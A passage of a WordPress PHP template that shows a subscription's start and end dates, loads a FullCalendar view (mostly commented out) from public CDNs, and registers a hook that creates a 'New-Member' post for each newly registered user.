                        <div class="end-date">

                            End Date: <?php echo $results[0]->expire_time ;?>

                        </div>
                        <div class="start-date">

                            Start Date: <?php echo $results[0]->start_time ;?>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <link
            rel="stylesheet"
            href="https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/3.10.2/fullcalendar.min.css"
            integrity="sha512-KXkS7cFeWpYwcoXxyfOumLyRGXMp7BTMTjwrgjMg0+hls4thG2JGzRgQtRfnAuKTn2KWTDZX4UdPg+xTs8k80Q=="
            crossorigin="anonymous"
            referrerpolicy="no-referrer"
    />
    <div id="calendar"></div>

    <!-- Load Jquery -->
    <script
            src="https://code.jquery.com/jquery-3.6.0.min.js"
            integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
            crossorigin="anonymous"
    ></script>
    <!-- Movments -->
    <script
            src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"
            integrity="sha512-qTXRIMyZIFb8iQcfjXWCO8+M5Tbc38Qi5WzdPOYZHIlZpzBHG3L3by84BBBOiRGiEb7KKtAOAs5qYdUiZiQNNQ=="
            crossorigin="anonymous"
            referrerpolicy="no-referrer"
    ></script>
    <!-- Fulll calendar -->

    <script
            src="https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/3.10.2/fullcalendar.min.js"
            integrity="sha512-o0rWIsZigOfRAgBxl4puyd0t6YKzeAw9em/29Ag7lhCQfaaua/mDwnpE2PVzwqJ08N7/wqrgdjc2E0mwdSY2Tg=="
            crossorigin="anonymous"
            referrerpolicy="no-referrer"
    ></script>
    <script>
        jQuery(document).ready(function() {

            jQuery('#calendar').fullCalendar({
                header: {
                    left: 'prev,next today',
                    center: 'title',
                    right: 'month'
                },


        // eventRender: function (event, element, view) {
        //         var nextEventLeft = element.offset().left + element.width() + 5;
        //           element.parent().children().eq(element.index()+1).css('left',nextEventLeft);
        //         },
        //         selectable: true,
        //         selectHelper: true,

        // //defaultDate: '2016-12-12',
        // navLinks: false, // can click day/week names to navigate views
        // editable: false,
        // eventLimit: true, // allow "more" link when too many events
        // events: [


        // // {
        // // title: 'My Subscription',
        // 				// 	start: '<?php echo $results[0]->start_time;?>',
        // 				// 	end: '<?php echo $results[0]->expire_time;?>'

        // // },


        // ],




        // });

        //  function IsCurrentMonth() {
        //         if ($('.fc-today-button').hasClass('fc-state-disabled'))
        //             $('.fc-prev-button').closest('#calendar').addClass('current-month');
        //         else
        //             $('.fc-prev-button').closest('#calendar').removeClass('current-month');
        //     }
        //     IsCurrentMonth();
        //     $('.fc-prev-button').click(function() {
        //         IsCurrentMonth();
        //     });

        //  $('.fc-next-button').click(function() {
        //         IsCurrentMonth();
        //     });


        // });


        // </script>
    <?php



}
add_action('user_register','my_function');
function my_function($user_id){
    $key = 'first_name';
    $single = true;
    $user_first = get_user_meta( $user_id, $key, $single );
    $get_user = array(
        'post_type' =>  'New-Member',
        'post_title'    =>  $user_first,
        'post_content'  => '',
        'post_status'   => 'publish',
        'post_author'   => $user_id,
    );
    $post_id = wp_insert_post( $get_user );
    $value  =10;
    update_field('match_count',$value ,$post_id);
}